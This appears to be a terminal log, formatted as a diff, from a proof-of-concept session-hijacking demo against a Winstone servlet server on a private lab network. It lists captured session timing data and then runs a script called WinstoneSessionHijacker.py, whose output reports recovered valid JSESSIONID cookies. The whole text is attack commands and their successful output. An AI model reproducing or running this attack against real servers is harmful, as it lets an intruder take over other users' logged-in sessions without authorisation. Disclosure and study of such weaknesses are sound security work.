@@ -1,0 +1,11 @@
+root@kali64:~/winstone# cat winstonesessions.txt 
+JSESSIONID.20c360fd,1390138910129,1390138910954,142323399507830,1
+JSESSIONID.20c360fd,1390138974056,1390138974966,14057271211674,1
+root@kali64:~/winstone# python ./WinstoneSessionHijacker.py 
+Usage: WinstoneSessionHijacker.py [-f <FILENAME> | -s <STRING>] -u <URL> -i <IP>
+
+root@kali64:~/winstone# python ./WinstoneSessionHijacker.py -u "http://192.168.66.3:8080" -i 192.168.66.2 -s "log out"
+[!!!] Found valid cookie: JSESSIONID.20c360fd=93277ca1f09f43827ac186fd1be5cc49
+root@kali64:~/winstone# python ./WinstoneSessionHijacker.py -u "http://192.168.66.3:8080" -i 192.168.66.3 -s "log out"
+[!!!] Found valid cookie: JSESSIONID.20c360fd=0552ece6dfe86e2c9296b5be995fb4af
+root@kali64:~/winstone# 
